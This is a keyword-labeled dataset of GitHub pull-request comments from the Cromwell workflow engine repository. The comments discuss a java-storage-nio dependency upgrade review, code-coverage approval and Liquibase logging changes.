b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1746,Deployability,release,releases,1746,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2093,Deployability,release,releases,2093,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2429,Deployability,rollback,rollback,2429,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:939,Energy Efficiency,schedul,scheduled,939,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:40,Integrability,depend,dependency,40,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:979,Integrability,depend,dependency,979,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1027,Integrability,depend,dependency,1027,"o review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/goog",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1584,Integrability,depend,dependency,1584,"to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2370,Safety,safe,safety,2370,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2472,Safety,safe,safe,2472,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2559,Safety,risk,risk,2559,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1132,Security,audit,audit,1132,"o review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/goog",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6810#issuecomment-1194428496:88,Testability,test,tests,88,"Should be OK to go ahead and merge without the code coverage approval - it reflects the tests that actually ran on this PR, so it's finding none. If there's a way to only ignore the test we expect to fail, might be nice, but not a blocker for this PR IMO.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6810#issuecomment-1194428496
https://github.com/broadinstitute/cromwell/pull/6810#issuecomment-1194428496:182,Testability,test,test,182,"Should be OK to go ahead and merge without the code coverage approval - it reflects the tests that actually ran on this PR, so it's finding none. If there's a way to only ignore the test we expect to fail, might be nice, but not a blocker for this PR IMO.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6810#issuecomment-1194428496
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1152,Availability,alive,alive,1152,"ravis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [S",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2095,Availability,alive,alive,2095,"ntaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1522,Deployability,configurat,configuration,1522,"ationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2412,Deployability,configurat,configuration,2412,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
